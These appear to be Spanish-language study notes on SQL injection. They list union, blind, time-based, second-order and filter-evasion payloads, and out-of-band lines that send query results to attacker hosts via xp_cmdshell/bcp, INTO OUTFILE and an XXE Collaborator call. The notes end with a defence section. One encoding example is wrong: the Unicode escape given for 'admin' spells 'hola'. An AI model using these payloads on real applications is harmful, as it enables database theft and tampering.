# SQL Injection

Un **SQL Injection** es una vulnerabilidad que ocurre cuando una aplicación web incorpora entradas del usuario dentro de consultas a la base de datos **sin** tratarlas correctamente. Un atacante aprovecha esto para manipular la consulta SQL que ejecuta la aplicación, pudiendo leer, modificar o borrar datos, saltarse autenticaciones o, en casos graves, comprometer el servidor de la base de datos.

‍

https://portswigger.net/web-security/sql-injection/cheat-sheet

‍

## Versiones de SQL

|Microsoft, MySQL|​`            SELECT @@version        `|
| ------------------| ------|
|Oracle|​`            SELECT * FROM v$version        `|
|PostgreSQL|​`            SELECT version()        `|

‍

Chuleta: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

![62a7685ca6e7ce005d3f3afe-1716989638556](assets/62a7685ca6e7ce005d3f3afe-1716989638556-20250920154716-z04qg2z.svg)

# Tipos de ataques SQL Injection

## In-band SQL Injection

El atacante obtiene los datos **por el mismo canal** que usa la aplicación para responder. Es decir, la respuesta de la aplicación web contiene directamente la información extraída.

- Error-Based: El atacante fuerza a la BBDD a generar **mensajes de error** que, si la aplicación los muestra al usuario, contienen información útil (nombres de tablas, tipos, versión del SGBD, rastro de la consulta…)

  ​`SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`

- Union-Based: El atacante usa el operador `UNION`​ para **combinar el resultado de la consulta legítima** con el resultado de otra consulta controlada por el atacante.

  ​`SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin`

  Comprobaciones interesantes:

  - ​`' ORDER BY 1--`
  - ​`' ORDER BY N--`
  - ​`' UNION SELECT NULL--`
  - ​`' UNION SELECT NULL,NULL... --`
  - ​`' UNION SELECT 'a',NULL,NULL,NULL--` *Para encontrar tipos de datos MUY IMPORTANTE
  - ​`' UNION SELECT username || '~' || password FROM users--` *Para obtener multiples datos con una columna

‍

‍

## Inferential / Blind SQL Injection

La aplicación **no devuelve** los datos directamente ni muestra errores útiles; el atacante **obtiene** información observando comportamientos ante condiciones true/false o por el tiempo de respuesta.

- Boolean-based: El atacante hace preguntas que devuelven *verdadero* o *falso* internamente, y observa si la aplicación responde distinto para inferir la respuesta.

	`SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)`

	`…xyz' AND '1'='1 `​  
	`…xyz' AND '1'='2 `

	`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), N, 1) = 'caracter `

	`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

	`xyz' || (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||'`

	`xyz' || (SELECT CASE WHEN SUBSTR(password,N,1)='x' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||';`

- Time-Based: El atacante induce un retraso en la ejecución de la consulta cuando una condición es verdadera, y mide el tiempo de respuesta para inferir la verdad de esa condición

  Usar || TIEMPO (sin select) para probar si hay fallo

	`SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`

	`'; IF (1=2) WAITFOR DELAY '0:0:10'--`

​	`TrackingId=x'||pg_sleep(10)--`

‍

- Visible errors

  ​`'and 1=CAST((SELECT password from users LIMIT 1)as INT) --;` *Ojo con la longitud del sql injection, ir guiandose por los errores que devuelve la web.
- ​`' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1 ) THEN pg_sleep(8) ELSE pg_sleep(0) END from users) --;`

‍

‍

## Out-Of-Band SQL Injection

El atacante provoca que la base de datos **se comunique con un servidor externo controlado por el atacante** y así obtiene la información por un canal distinto (DNS, HTTP, etc.). Esto se usa cuando la respuesta directa no es posible o está filtrada.

​`SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`

​`EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`

​`1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --`

‍

## Second-Order (stored) SQL Injection

Ocurre cuando un dato malicioso se **guarda** en la aplicación (por ejemplo en la BD) en un primer momento sin efecto inmediato, y **se ejecuta más tarde** cuando ese dato se reutiliza en otra consulta SQL sin el debido tratamiento.

**Flujo / workflow**

* **Inserción**: el atacante introduce un valor (aparentemente inocuo) que se almacena en la base de datos. `12345'; UPDATE books SET book_name = 'Hacked'; --`
* **Reutilización**: la aplicación lee ese dato en otra parte (reportes, actualizaciones, procesos batch, vistas, etc.).
* **Ejecución**: ese dato se usa en una consulta SQL **sin parametrizar** o con SQL dinámico, activando la inyección. `http://MACHINE_IP/second/update.php`
* **Impacto**: ejecución de comandos no deseados (lectura/modificación/borrado), escalado de privilegios o persistencia del ataque.

​`' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT LO QUE SEA)||'.URL DE COLLABORATOR"> %remote;]>'),'/l') FROM dual) -- ;`

‍

‍

# Evasión de filtros

## Codificación de caracteres

- Codificación de URL: Consiste en usar el valor ASCII en hexadecimal por ejemplo `' OR 1=1--`​ se puede codificar como  `%27%20OR%201%3D1--` ayudando a saltarse los filtros.

  Un payload de ejemplo puede ser `1%27%20||%201=1%20--+`​ que decodificado significa `1' || 1=1 --`.

  ​`%27` es la codificación url de la comilla simple (').

  ​`%20` es la codificación url del espacio ( ).

  ​`||` representa el operador SQL OR.

  ​`%3D`​ es la codificación url del igual (\=).

  ​`%2D%2D` es la codificación url de --, para hacer comentarios en SQL

  ‍
- Codificación Hexadecimal: Consiste en representar cadenas como valores hexadecimales, imaginemos la query `SELECT * FROM users WHERE name = 'admin'` que puede codificarse como

  ​`SELECT * FROM users WHERE name = 0x61646d696e` permitiendo esquivar algunos filtros
- Codificación Unicode: Representar caracteres mediante Unicode `admin`​ se codifica como `\u0068\u006f\u006c\u0061` para saltarse filtros que solo comprueban ASCII.

‍

Codificar con CONTROL + U; usar Hackventor para xml, click derecho -> extensiones -> hackventor -> encode -> hex_entitites

‍

## No-Quote SQL Injection

Se denomina *no-quote* cuando el atacante evita usar comillas (simple o dobles) porque la app las filtra o elimina.

- **Uso de valores numéricos:** Una aproximación consiste en usar valores numéricos u otros tipos de datos que no requieren comillas. Por ejemplo, en vez de inyectar `' OR '1'='1`​, un atacante puede usar `OR 1=1` en un contexto donde no sean necesarias las comillas.
- **Uso de comentarios SQL:** Otro método consiste en usar comentarios SQL para terminar el resto de la consulta. Por ejemplo, la entrada `admin'--`​ puede transformarse en `admin--`​, donde `--` indica el inicio de un comentario en SQL y hace que se ignore el resto de la sentencia. Esto ayuda a evitar errores de sintaxis y a sortear ciertos filtros.
- **Uso de la función** **​`CONCAT()`​** ​  **(u otras funciones):** Los atacantes pueden usar funciones del SGBD como `CONCAT()`​ para construir cadenas sin usar comillas. Por ejemplo, `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)`​ construye la cadena `admin`​. Funciones como `CONCAT`​ o `CHAR` permiten ensamblar textos sin escribir las comillas directamente, lo que dificulta que los filtros detecten y bloqueen la carga maliciosa.

‍

## No Spaces Allowed

- **Comentarios para sustituir espacios:** Un método común es usar comentarios SQL (`/**/`​) en lugar de espacios. Por ejemplo, en vez de `SELECT * FROM users WHERE name = 'admin'`​, un atacante podría escribir `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`. Los comentarios pueden actuar como separadores y permitir pasar filtros que eliminan o bloquean espacios.
- **Tabulaciones o saltos de línea:** Otra opción es usar caracteres de tabulación (`\t`​) o salto de línea (`\n`​) como sustitutos del espacio. Algunos filtros pueden permitir estos caracteres, permitiendo construir consultas como `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`. Esta técnica elude filtros que buscan específicamente espacios ASCII.
- **Caracteres alternativos (codificados):** También se pueden emplear caracteres de espacio alternativos codificados en URL, como `%09`​ (tab horizontal), `%0A`​ (salto de línea), `%0C`​ (form feed), `%0D`​ (carriage return) o `%A0` (espacio no separable). Estos caracteres pueden reemplazar los espacios en la carga y ser interpretados por el analizador SQL.

‍

## Consultar a la BBDD

​`information_schema.tables`​ que tiene como salida `TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE`

Y entonces preguntar por columnas de una tabla `information_schema.columns`

# Herramientas utiles

**SQLMap:** SQLMap es una herramienta de código abierto que automatiza el proceso de **detección** y **explotación** de vulnerabilidades de inyección SQL en aplicaciones web. Soporta una amplia variedad de sistemas de gestión de bases de datos y ofrece muchas opciones tanto para la identificación como para la explotación. Puedes obtener más información en su documentación o repositorio oficial.

**SQLNinja:** SQLNinja es una herramienta diseñada específicamente para explotar vulnerabilidades de inyección SQL en aplicaciones web que utilizan **Microsoft SQL Server** como base de datos. Automatiza distintas fases de la explotación, incluyendo la identificación (fingerprinting) de la base de datos y la extracción de datos.

**JSQL Injection:** Biblioteca en Java centrada en la detección de vulnerabilidades de inyección SQL dentro de aplicaciones Java. Soporta varios tipos de ataques de inyección SQL y proporciona distintas opciones para extraer datos y, si la vulnerabilidad lo permite, tomar control de la base de datos.

**BBQSQL:** BBQSQL es un framework para explotación de **Blind SQL Injection** (inyección SQL a ciegas) diseñado para ser sencillo y muy efectivo en la automatización de explotaciones de este tipo de vulnerabilidades.



## 🛡️ Buenas Prácticas y Medidas de Defensa (Prevención de SQLi)

Prevenir la Inyección SQL es fundamental y se basa en un principio clave: **nunca confíes en la entrada del usuario y separa siempre el código de los datos.**

* ✅ **Consultas Parametrizadas (Prepared Statements):**
    Esta es la **medida de defensa más importante y efectiva.** En lugar de construir una cadena de texto con los datos del usuario, se usa una plantilla de consulta con "marcadores" (`?` o `:nombre`). Luego, los datos del usuario se envían por separado.

    

    **Inseguro (Concatenación):**
    ```php
    $query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "';";
    ```
    **Seguro (Parametrizado con PDO en PHP):**
    ```php
    // 1. La consulta es una plantilla
    $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user');

    // 2. Los datos se "atan" al marcador. La BBDD nunca los ejecuta.
    $stmt->execute(['user' => $_GET['user']]);
    $user = $stmt->fetch();
    ```
    **Por qué funciona:** La base de datos recibe la "intención" (la plantilla de la consulta) y los "datos" por separado. Trata la entrada del usuario (`' OR 1=1--`) como un simple texto a buscar, no como parte del comando SQL.

* ✅ **Procedimientos Almacenados (Stored Procedures):**
    Son similares a las consultas parametrizadas. Si se usan correctamente (es decir, **no** construyendo SQL dinámico dentro de ellos), son inherentemente seguros contra SQLi.

* ✅ **Principio de Mínimo Privilegio:**
    El usuario de la base de datos que utiliza la aplicación web **nunca** debe ser un administrador (`root`, `dbo`, `sa`). Debe tener los permisos mínimos indispensables (ej. solo `SELECT`, `INSERT`, `UPDATE` en las tablas que necesita).
    * **Impacto:** Esto previene que un atacante pueda usar `xp_cmdshell`, leer `information_schema`, o `INTO OUTFILE` en directorios sensibles.

* ✅ **Desactivar Errores Detallados en Producción:**
    Nunca muestres errores detallados de la base de datos al usuario final. Esto neutraliza por completo la *Inyección SQL basada en Errores*.

* ✅ **Uso de ORMs (Object-Relational Mapping):**
    Frameworks modernos (como Django, Ruby on Rails, SQLAlchemy en Python, TypeORM en Node.js) usan ORMs que, por defecto, generan consultas parametrizadas. Son seguros siempre y cuando no se usen funciones para ejecutar "SQL crudo" (`raw_query`) con datos del usuario.

* 🚫 **Validación de Entradas (Sanitización):**
    Aunque es útil como defensa en profundidad (ej. rechazar entradas que contengan `--`, `'`, `OR`), **no debe ser la única defensa.** Los atacantes siempre encuentran formas de evadir los filtros (como viste en la sección "Evasión de filtros"). Úsalo como complemento, no como la solución principal.

‍
